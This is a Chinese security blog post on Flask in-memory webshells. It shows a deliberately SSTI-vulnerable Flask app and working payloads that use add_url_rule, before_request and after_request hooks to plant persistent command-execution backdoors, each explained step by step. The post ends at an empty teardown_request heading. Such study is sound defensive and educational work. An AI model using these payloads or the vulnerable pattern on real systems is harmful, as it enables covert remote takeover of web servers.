<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>python flask内存马学习 | B1ueL0n3's blog</title><meta name="author" content="B1ueL0n3"><meta name="copyright" content="B1ueL0n3"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="概念内存马，也被称为无文件马，是无文件攻击的一种常用手段。 常用的python框架有Django、flask，而这两种框架都可能存在SSTI漏洞。python 内存马就是利用flask框架中SSTI或者pickle反序列化来实现的，通过添加新的路由访问该路由实现命令执行。 请求上下文管理机制当网页请求进入flask时，会实例化一个requset context.在python中分出了两种上下文：请">
<meta property="og:type" content="article">
<meta property="og:title" content="python flask内存马学习">
<meta property="og:url" content="https://b1uel0n3.github.io/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="B1ueL0n3&#39;s blog">
<meta property="og:description" content="概念内存马，也被称为无文件马，是无文件攻击的一种常用手段。 常用的python框架有Django、flask，而这两种框架都可能存在SSTI漏洞。python 内存马就是利用flask框架中SSTI或者pickle反序列化来实现的，通过添加新的路由访问该路由实现命令执行。 请求上下文管理机制当网页请求进入flask时，会实例化一个requset context.在python中分出了两种上下文：请">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://b1uel0n3.github.io/img/10.jpg">
<meta property="article:published_time" content="2025-02-07T15:21:11.000Z">
<meta property="article:modified_time" content="2025-02-08T14:27:24.990Z">
<meta property="article:author" content="B1ueL0n3">
<meta property="article:tag" content="web">
<meta property="article:tag" content="python">
<meta property="article:tag" content="内存马">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://b1uel0n3.github.io/img/10.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "python flask内存马学习",
  "url": "https://b1uel0n3.github.io/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/",
  "image": "https://b1uel0n3.github.io/img/10.jpg",
  "datePublished": "2025-02-07T15:21:11.000Z",
  "dateModified": "2025-02-08T14:27:24.990Z",
  "author": [
    {
      "@type": "Person",
      "name": "B1ueL0n3",
      "url": "https://b1uel0n3.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/toux.jpg"><link rel="canonical" href="https://b1uel0n3.github.io/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'python flask内存马学习',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/4.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/" title="回到主页"><span class="site-name">B1ueL0n3's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">python flask内存马学习</span></a><!--鼠标下滑时的文章标题显示--></span><div class="mask-name-container"><center id="name-container"><a id="page-name" href="javascript:btf.scrollToDest(0, 500)"></a></center></div><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">python flask内存马学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-07T15:21:11.000Z" title="发表于 2025-02-07 23:21:11">2025-02-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-08T14:27:24.990Z" title="更新于 2025-02-08 22:27:24">2025-02-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/python/">python</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>内存马</strong>，也被称为<strong>无文件马</strong>，是无文件攻击的一种常用手段。</p>
<p>常用的python框架有<code>Django</code>、<code>flask</code>，而这两种框架都可能存在SSTI漏洞<strong>。<code>python 内存马</code><strong>就是利用flask框架中</strong>SSTI</strong>或者<strong>pickle反序列化</strong>来实现的，通过添加新的路由访问该路由实现命令执行。</p>
<h1 id="请求上下文管理机制"><a href="#请求上下文管理机制" class="headerlink" title="请求上下文管理机制"></a>请求上下文管理机制</h1><p>当网页请求进入flask时，会实例化一个<code>requset context</code>.在python中分出了两种上下文：<strong>请求上下文(request context)、应用上下文(session context).<strong>一个请求上下文中封装了请求的信息，而上下文的结构是运用了一个stack的栈结构，也就是说它拥有一个栈所拥有的全部特性</strong>。<code>request context</code>实例化后会被push到栈<code>_request_ctx_stack</code>中，基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</strong> </p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>利用flask编写一个SSTI例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hello, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>原始flask内存马payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>

<p>下面我们将Payload拆开来, 逐层分析：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>前面的<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>中，<code>url_for</code>是flask的一个方法，可以调用<code>__globals__</code>属性，**<code>__globals__</code>能返回函数所在模块命名空间的所有变量<strong>，其中包括很多已经引用的模块，而这里是有<code>__builtins__</code>的，而</strong><code>__builtins__</code>中包含很多内建函数**，其中包括命令执行函数<code>eval()</code>。即这一步主要是为了获取命令执行函数<code>eval()</code>，当然采用SSTI其他payload获取该函数也是可以的</p>
<p>而后面的<code>app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())</code>用于动态注册一个新的路由规则。</p>
<p>在flask中我们通常使用**<code>@app.route()</code><strong>装饰器来添加路由，而其也是调用了<code>add_url_rule</code>函数来添加路由的。</strong><code>app.add_url_rule</code>** 提供了更为底层和灵活的方式来定义路由，尤其适合在动态或程序化场景下使用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.png"></p>
<blockquote>
<ul>
<li>rule: 函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头.</li>
<li>endpoint: 端点, 即在使用<code>url_for</code>进行反转的时候, 这里传入的第一个参数就是<code>endpoint</code>对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为<code>endpoint</code>的值.</li>
<li>view_func: <code>URL</code>对应的函数, 这里只需写函数名字而不用加括号.</li>
<li>provide_automatic_options: 控制是否应自动添加选项方法.</li>
<li>options: 要转发到基础规则对象的选项.</li>
</ul>
</blockquote>
<p>而这里<code>&#39;/shell&#39;</code>指路由的路径。<code>shell</code>是路由规则的名称，它是这个路由的标识符，可以在其他地方引用。**<code>lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</code><strong>则是该路由对应的函数，这里定义的一个匿名函数<code>lambda</code>，用于执行命令，</strong>通过<code>_request_ctx_stack.top</code>指向请求上下文栈的顶部元素，即当前正在处理的请求，再通过<code>request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>获取请求中cmd参数的值，默认为<code>whoami</code>，通过<code>read()</code>标准输出，从而达到添加路由做到任意命令执行**</p>
<p>再来看看<code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code>这一截<code>Payload</code>。 <strong><code>_request_ctx_stack</code><strong>是<code>Flask</code>的一个全局变量, 是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>。</strong><code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>。</strong>这里指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到。</p>
<blockquote>
<p>这里app的获取也可以通过**<code>sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].add_url_rule(&#39;/shell&#39;,&#39;shell&#39;,lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())</code>**</p>
</blockquote>
<h1 id="add-url-rule的局限"><a href="#add-url-rule的局限" class="headerlink" title="add_url_rule的局限"></a>add_url_rule的局限</h1><p>上面的payload只针对旧版，但由于新版关闭debug模式会调用check函数，即<code>_check_setup_finished()</code>函数引起报错</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p>
<p>意思就是这个app已经跑起来了,这个函数就不能再被调用了.调试之后发现这个方法的<code>@setupmethod</code>装饰器会先check一次,所以基本上是完全不能用了.</p>
<p>所以旧版不能用的大致原因是因为在可以动态添加路由和错误处理逻辑(如<code>register_error_handler()</code>方法)都被**<code>@setupmethod</code>装饰器修饰<strong>了,而<code>@setupmethod</code>装饰器会在Flask跑起来之前就把这些方法都加到一个被check的名单里,以后</strong>再被调用的话就会被<code>@setupmethod</code>这个装饰器给check然后报错**</p>
<p>所以add_url_rule就不能用了，这里就需要其他方法挂内存🐎</p>
<h1 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h1><p><strong>python装饰器：装饰器本质上是一个可调用的对象(函数或类), 它接收一个函数或类座位参数,并返回一个新的函数或类.这个新的函数或类通常会保留原始函数或类的功能,但会在其基础上添加一些额外的逻辑.</strong></p>
<p>在flask中，**<code>before_request</code>是一个装饰器，它用于在请求处理之前执行特定的函数**。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等。</p>
<p>举个例子：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/3.png"></p>
<p>这里验证请求头是否包含<code>Authorization</code>字段，如果没有，则返回未授权的错误响应(401)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/4.png"></p>
<p>可以看到<code>before_request</code>实际上调用的是**<code>self.before_request_funcs.setdefault(None, []).append(f)</code>**，其意思是：</p>
<ul>
<li>检查 <code>self.before_request_funcs</code> 字典中是否有一个键为 <code>None</code> 的条目。</li>
<li>如果没有 <code>None</code> 键，就在字典中创建它，并将其值设置为一个空列表。</li>
<li><strong>然后，无论 <code>None</code> 键是否存在，都将函数 <code>f</code> 添加到这个列表中。</strong></li>
</ul>
<p>这个函数f就是我们要添加的函数。</p>
<p>而该函数就添加之前payload的lambda匿名函数即可</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].before_request_funcs.setdefault(<span class="literal">None</span>,[]).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read())</span><br></pre></td></tr></table></figure>

<h1 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h1><p><code>after_request</code>与<code>before_request</code>类似。<code>after_request</code>方法允许我们在每个请求之后执行一些操作。我们可以利用该方法来添加一些响应头、记录请求日志等任务</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/5.png"></p>
<p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>传入的f就是对应的自定义函数，但这里的f需要接收一个response对象，同时返回一个response对象。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp: CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span> <span class="built_in">exec</span>(<span class="string">&#x27;global r;r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(&#x27;</span>cmd<span class="string">&#x27;)).read())&#x27;</span>)==<span class="literal">None</span> <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure>

<p>逐行解释这段代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> resp: <span class="comment">#传入参数</span></span><br><span class="line">    CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span>      <span class="comment">#如果请求参数含有cmd则返回命令执行结果</span></span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        global r;     #定义一个全局变量,方便获取</span></span><br><span class="line"><span class="string">        r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span></span><br><span class="line"><span class="string">    &#x27;</span>)==<span class="literal">None</span>    <span class="comment">#恒真</span></span><br><span class="line">    <span class="keyword">else</span> resp)  <span class="comment">#如果请求参数没有cmd则正常返回</span></span><br><span class="line"><span class="comment">#这里的cmd参数名和r变量名都是可以改的</span></span><br></pre></td></tr></table></figure>

<p>不带出回显，适用于过滤严格的场景：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> x:<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(request.args.get(<span class="string">&quot;cmd&quot;</span>)))</span><br></pre></td></tr></table></figure>

<h1 id="Flask中的其他钩子函数"><a href="#Flask中的其他钩子函数" class="headerlink" title="Flask中的其他钩子函数"></a>Flask中的其他钩子函数</h1><p>其实<code>after_request()</code>和<code>before_request()</code>有一个共同的分类叫钩子函数.钩子函数是指在执行函数和目标函数之间挂载的函数,框架开发者给调用方提供一个point-挂载点,至于挂载什么函数由调用方决定.</p>
<p><strong>@before_first_request</strong></p>
<p>在对应用程序实例的第一个请求之前注册要运行的函数,只会运行一次.</p>
<p><strong>@before_request</strong></p>
<p>在每个请求之前注册一个要运行的函数,每一次请求都会执行一次.</p>
<p><strong>@after_request</strong></p>
<p>在每个请求之后注册一个要运行的函数,每次请求完成后都会执行.需要接收一个 Response 对象作为参数,并返回一个新的 Response 对象,或者返回接收的 Response 对象.</p>
<p><strong>@teardown_request</strong></p>
<p>注册在每一个请求的末尾,不管是否有异常,每次请求的最后都会执行.</p>
<p><strong>@context_processor</strong></p>
<p>上下文处理器,返回的字典可以在全部的模板中使用.</p>
<p><strong>@template_filter(‘upper’)</strong></p>
<p>增加模板过滤器,可以在模板中使用该函数,后面的参数是名称,在模板中用到.</p>
<p><strong>@errorhandler(400)</strong></p>
<p>发生一些异常时,比如404,500,或者抛出异常(Exception)之类的,就会自动调用该钩子函数.</p>
<p>1.发生请求错误时,框架会自动调用相应的钩子函数,并向钩子函数中传入error参数.</p>
<p>2.如果钩子函数没有定义error参数,就会报错.</p>
<p>3.可以使用<code>abort(http status code)</code>函数来手动终止请求抛出异常,如果要是发生参数错误,可以abort(404)之类的.</p>
<p><strong>@teardown_appcontext</strong></p>
<p>不管是否有异常,注册的函数都会在每次请求之后执行.flask 为上下文提供了一个<code>teardown_appcontext</code>钩子,使用它注册的毁掉函数会在程序上下文被销毁时调用,通常也在请求上下文被销毁时调用.某些情况下这个函数和**@teardown_request**的行为是类似的,一个是请求上下文被销毁时被调用,另一个是应用上下文被销毁时调用.</p>
<p>比如你需要在每个请求处理结束后销毁数据库连接：app.teardown_appcontext 装饰器注册的回调函数需要接收异常对象作为参数,当请求被正常处理时这个参数将是None,这个函数的返回值将被忽略.</p>
<h2 id="before-request-after-request和-teardown-request-teardown-appcontext的区别"><a href="#before-request-after-request和-teardown-request-teardown-appcontext的区别" class="headerlink" title="@before_request&#x2F;@after_request和@teardown_request&#x2F;@teardown_appcontext的区别"></a>@before_request&#x2F;@after_request和@teardown_request&#x2F;@teardown_appcontext的区别</h2><p><strong>@after_request</strong>是在视图函数处理完请求并生成响应对象之后，但在响应被发送给客户端之前。而且这个函数需要接收当前的响应作为参数,并可以返回一个新的响应对象或者返回原来的响应对象.</p>
<p><strong>@teardown_request&#x2F;@teardown_appcontext</strong>无论请求是否成功完成，无论是否发生了异常,是在响应已经被发送给客户端之后被触发,而且不接受任何参数.</p>
<p><strong>@after_request</strong>装饰的函数如果抛出了异常就会直接跳转到错误处理机制.</p>
<p><strong>@teardown_request&#x2F;@teardown_appcontext</strong>装饰的函数被抛出的异常通常会被忽略.</p>
<h2 id="teardown-request的利用"><a href="#teardown-request的利用" class="headerlink" title="@teardown_request的利用"></a>@teardown_request的利用</h2><p>payload:</p>
